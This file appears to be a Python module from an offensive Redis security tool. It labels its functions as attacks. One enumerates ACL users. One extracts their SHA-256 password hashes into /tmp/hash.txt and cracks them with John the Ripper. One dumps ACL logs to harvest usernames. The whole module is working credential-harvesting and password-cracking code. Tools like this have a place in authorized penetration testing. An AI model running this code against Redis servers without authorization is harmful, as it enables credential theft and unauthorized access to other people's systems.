from .common import get_assume_defaults_value, proceed_with_cached_connection, \
        write_file, execute_command, print_kv_pairs

import json
from time import time



ACL_USERS = {}
DISCOVERED_USERS = set()


AVAILABLE_ATTACKS = [
    "retrieve_acl_entries",
    "crack_acl_password_hashes",
    "retrieve_acl_logs"
]



def parse_acl_help():
    return "\nReturns the parsed ACL entries, primarily for the end user\n" \
    "to view the ACL logs without requiring Redis expertise.\n"



def parse_acl(acl_entries):

    global ACL_USERS

    for entry in acl_entries:
        parts = entry.split(" ")

        key_patterns = []
        pub_sub_channels = []
        allowed_commands = []
        disallowed_commands = []

        for part in parts:
            if part.startswith("~"):
                key_patterns.append(part)

            elif part.startswith("&"):
                pub_sub_channels.append(part)

            elif part.startswith("+"):
                allowed_commands.append(part)

            elif part.startswith("-"):
                disallowed_commands.append(part)

        ACL_USERS[parts[1]] = {
            "status": parts[2],
            "password_hash": parts[3] if parts[3].startswith("#") else "",
            "key_patterns": key_patterns,
            "pub_sub_channels": pub_sub_channels,
            "allowed_commands": allowed_commands,
            "disallowed_commands": disallowed_commands
        }

    return ACL_USERS



def retrieve_acl_entries_help():
    return "\nReturns all the ACL entries and displays them in a\n" \
    "user-friendly manner (no Redis expertise required).\n"



def retrieve_acl_entries():

    redis = proceed_with_cached_connection()
    acl_entries = redis.acl_list()

    acl_users_info = parse_acl(acl_entries)
    print_kv_pairs(acl_users_info, label = "ACL Users Info")



def crack_acl_password_hashes_help():
    return "\nCracks the ACL hashes recovered while enumerating\n" \
    "the available ACL entries. Make sure John The Ripper\nis" \
    "installed.\n"



def crack_acl_password_hashes():

    assume_defaults = get_assume_defaults_value()

    if assume_defaults and not ACL_USERS:
        # No ACL users and we are asked to run the attack...
        # Can't do it!
        print ("\n[*] No ACL credentials discovered.\n")
        return

    # Make sure JTR is installed!
    proceed = "y"

    if not assume_defaults:
        proceed = input("\nContinue with the discovered ACL credentials? (default='yes') [y/N] ") or proceed

    if proceed.lower() == "n":
        hash_file = input("\nProvide file containing the hashes (format => username:password): ").strip()

    else:
        hash_file = "/tmp/hash.txt"
        data = ""
        for user in ACL_USERS:
            if "password_hash" in ACL_USERS[user] and ACL_USERS[user]["password_hash"]:
                data += f"{user}:{ACL_USERS[user]['password_hash'][1:]}\n"

        if data:
            write_file(hash_file, data)

        else:
            print ("\n[-] No hashes recovered.\n")
            return

    wordlist_file = None

    if not assume_defaults:
        wordlist_file = input("\nSpecify a wordlist file path (or press enter to use the default file): ")

    if wordlist_file:
        command = [ "john" , "--format=raw-sha256", f"--wordlist={wordlist_file}", hash_file ]

    else:
        command = [ "john" , "--format=raw-sha256", hash_file ]

    # print ("command:", command)
    print (f"\n[*] Cracking the hashes from file: `{hash_file}`")
    execute_command(command)
    print ()

    command = [ "john" , "--show", "--format=raw-sha256", hash_file ]
    execute_command(command)
    print ()



def retrieve_acl_logs_help():
    return "\nRetrieves ACL Logs. It's a treasure-trove for both\n" \
    "Red- and Blue-teamers.\n"



def retrieve_acl_logs():

    global DISCOVERED_USERS

    redis = proceed_with_cached_connection()
    log_entries = redis.acl_log()

    log_file = f"/tmp/redis-acl-logs-{int(time())}.json"

    write_file(log_file, json.dumps(log_entries))
    print (f"\nLogs have been saved to '{log_file}'.")

    for log in log_entries:
        # print (log)
        # print ("username =>", log["username"])
        DISCOVERED_USERS.add(log["username"])
        print_kv_pairs(log)

    print (f"\n[Discovered Users]: {len(DISCOVERED_USERS)}")

    for user in DISCOVERED_USERS:
        print (user)

    print ()



def get_available_attacks():
    return AVAILABLE_ATTACKS



def perform_acl_attack(attack_name):
    if attack_name in AVAILABLE_ATTACKS:
        globals()[attack_name]()
    else:
        print ("\n[-] Invalid attack name.\n")



if __name__ == "__main__":
    retrieve_acl_entries()
    crack_acl_password_hashes()
    retrieve_acl_logs()